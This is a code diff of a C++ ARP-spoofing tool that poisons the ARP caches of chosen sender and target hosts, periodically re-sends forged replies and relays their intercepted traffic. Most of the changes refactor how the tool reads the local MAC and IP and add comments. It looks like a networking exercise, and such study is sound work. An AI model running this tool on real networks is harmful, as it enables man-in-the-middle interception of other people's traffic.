@@ -7,14 +7,11 @@
 #include "EthTcpPacket.h"
 #include "ethhdr.h"
 #include "arphdr.h"
-#include <iostream>
-#include <string>
-#include <vector>
-#include <iostream>
 #include<time.h>
 #define RELAY 1
 #define INFECT 2
-using namespace std;
+#define MAX_AGENTS 40
+#define MAX_PACKET_SIZE 1514
 #pragma pack(push, 1)
 struct Spoof final{
     Spoof(){}
@@ -31,19 +28,49 @@ public:
 #pragma pack(pop)
 Spoof spoofarr[40];
 int idx=0;
-
+//usage
 void usage() {
 	printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]");
 	printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2");
 }
-Mac getmymac(struct ifreq ifr){
+//get my mac
+Mac getmymac(char* dev){
+	int sock;
+	struct ifreq ifr;
+	memset(&ifr, 0x00, sizeof(ifr));
+    strcpy(ifr.ifr_name, dev);
+    int fd=socket(AF_INET, SOCK_DGRAM, 0);
+    if((sock=socket(AF_INET, SOCK_DGRAM, 0))<0){
+        perror("socket ");
+    }
+    if(ioctl(fd,SIOCGIFHWADDR,&ifr)<0){
+        perror("ioctl mac");
+        exit(1);
+    }
+	close(sock);
 	Mac mymac=Mac(ifr.ifr_hwaddr); //using overloaded constructor
 	return mymac;
 }
-Ip getmyip(struct ifreq ifr){
-	Ip myip=Ip(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr); //using overloaded constructor
+//get my ip
+Ip getmyip(char* dev){
+	int sock;
+	struct ifreq ifr_ip;
+	memset(&ifr_ip, 0x00, sizeof(ifr_ip));
+    strcpy(ifr_ip.ifr_name, dev);
+ 	ifr_ip.ifr_addr.sa_family = AF_INET;
+    int fd=socket(AF_INET, SOCK_DGRAM, 0);
+    if((sock=socket(AF_INET, SOCK_DGRAM, 0))<0){
+        perror("socket ");
+    }
+	if(ioctl(fd,SIOCGIFADDR,&ifr_ip)<0){
+        perror("ioctl ip");
+        exit(1);
+    }
+	close(sock);
+	Ip myip=Ip(((struct sockaddr_in *)&ifr_ip.ifr_addr)->sin_addr); //using overloaded constructor
 	return myip;
 }
+//get mac
 Mac getmac(pcap_t* handle, Ip mip, Ip sip, Mac mmac){
 	EthArpPacket packet;
 	const u_char* rawpacket;
@@ -83,16 +110,14 @@ Mac getmac(pcap_t* handle, Ip mip, Ip sip, Mac mmac){
 			continue;
     }
 }
-void Relay(pcap_t* handle, const u_char* packet, Mac mmac, int len){
+//send relay packet
+void Relay(pcap_t* handle, const u_char* packet, Mac mmac, int size){
 	int flag=0;
-	EthHdr* ethinfo=(EthHdr*)packet;
-	IpHdr* ipinfo=(IpHdr*)(packet+ETHHDRSIZE);
-	int size=len;
 	u_char* relaypacket=(u_char*)malloc(sizeof(char)*size);
 	memcpy(relaypacket, packet, sizeof(char)*size);
 	EthHdr* ethhdr=(EthHdr*)relaypacket;
-	IpHdr* iphdr=(IpHdr*)(relaypacket+ETHHDRSIZE);
-	for(int i=0; i<idx; i++){///searching for matched ip
+	IpHdr* iphdr=(IpHdr*)(relaypacket+ETHHDRSIZE);// arp packets - already filtered
+	for(int i=0; i<idx; i++){///searching for matching ip
 		if(spoofarr[i].smac_==ethhdr->smac_){
 			flag=1;
 			ethhdr->smac_=mmac;
@@ -105,10 +130,6 @@ void Relay(pcap_t* handle, const u_char* packet, Mac mmac, int len){
 		int res = pcap_sendpacket(handle, relaypacket, size);
 		if (res != 0) {
 			fprintf(stderr, "pcap_sendpacket return %d error=%s\n",res, pcap_geterr(handle));
-			res = pcap_sendpacket(handle, relaypacket+1514, size-1514); //if error, send again
-			if (res != 0) {
-				fprintf(stderr, "pcap_sendpacket return %d error=%s Again\n",res, pcap_geterr(handle));
-			}
 		}
 	}
 	free(relaypacket);	
@@ -142,7 +163,7 @@ int parsing(const u_char* packet, Ip mip){
 		ArpHdr* arphdr=(ArpHdr*)(packet+ETHHDRSIZE);
 		return INFECT;
 	}
-	else if(ntohs(ethhdr->type_)==EthHdr::Ip4 || ntohs(ethhdr->type_)==EthHdr::Ip6 ){
+	else {
 		IpHdr* iphdr=(IpHdr*)(packet+ETHHDRSIZE);
 		Ip dip=ntohl(iphdr->ip_dst);
 		if(dip==mip)// own to me
@@ -175,14 +196,19 @@ void init(pcap_t* handle,Ip senderip, Ip targetip, Ip myip, Mac mmac){
 	memcpy(&spoofarr[idx++],&result,sizeof(Spoof));
 }
 int main(int argc, char* argv[]) {
+	//initial setting
+	int len=(argc-2)/2;
 	if (argc %2==1) {
 		usage();
+		if(len>MAX_AGENTS){
+			printf("Too may arguments!\n");
+			return -1;
+		}
 		return -1;
 	}
-	int len=(argc-2)/2;
 	char* dev = argv[1];
 	char errbuf[PCAP_ERRBUF_SIZE];
-	pcap_t* handle = pcap_open_live(dev, 1514, 1, 1, errbuf); //read_timeout 10
+	pcap_t* handle = pcap_open_live(dev, MAX_PACKET_SIZE, 1, 1, errbuf);
 	pcap_set_immediate_mode(handle,3);
 	if (handle == nullptr) {
 		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
@@ -192,39 +218,18 @@ int main(int argc, char* argv[]) {
 	EthArpPacket packet;
 	EthTcpPacket* tcppacket;
 	EthArpPacket* arppacket;
-	///using ioctl & ifreq to get device information
-	int sock;
-	struct ifreq ifr;
-	struct ifreq ifr_ip;
-	memset(&ifr, 0x00, sizeof(ifr));
-    strcpy(ifr.ifr_name, dev);
-	memset(&ifr_ip, 0x00, sizeof(ifr));
-    strcpy(ifr_ip.ifr_name, dev);
- 	ifr_ip.ifr_addr.sa_family = AF_INET;
-
-    int fd=socket(AF_INET, SOCK_DGRAM, 0);
-    if((sock=socket(AF_INET, SOCK_DGRAM, 0))<0){
-        perror("socket ");
-    }
-    if(ioctl(fd,SIOCGIFHWADDR,&ifr)<0){
-        perror("ioctl mac");
-        exit(1);
-    }
-	if(ioctl(fd,SIOCGIFADDR,&ifr_ip)<0){
-        perror("ioctl ip");
-        exit(1);
-    }
-	close(sock);
-	///
-	Ip myip=getmyip(ifr_ip);
-	Mac mmac=getmymac(ifr);
+	
+	Ip myip=getmyip(dev);
+	Mac mmac=getmymac(dev);
 	printf("[info] collect my ip mac completed\n");
+	//initializing spoofed arp array
 	for(int i=0; i<len; i++){
 		printf("[info] init\n");
 		init(handle, Ip(argv[2+i*2]),Ip(argv[3+i*2]),myip, mmac);
 	}
+	// send arp replay at first
 	for(int i=0; i<idx; i++){
-		printf("sending arp!!...\n");
+		printf("[info]sending initial arp!!...\n");
 		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&spoofarr[i].infctpckt), sizeof(EthArpPacket));
 		if (res != 0) {
 			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
@@ -234,10 +239,10 @@ int main(int argc, char* argv[]) {
 	clock_t start=clock();
 	while(1){
 		clock_t end=clock();
-		if((end - start)>20000){
-			printf("flooding...\n");
+		if((end - start)>20000){//time to spread arp
+			printf("[info]spreading arp...\n");
 			SendInfectFlood(handle);
-			start=end;
+			start=clock();
 		}
 		struct pcap_pkthdr* header;
 		int res = pcap_next_ex(handle, &header, &rawpacket);
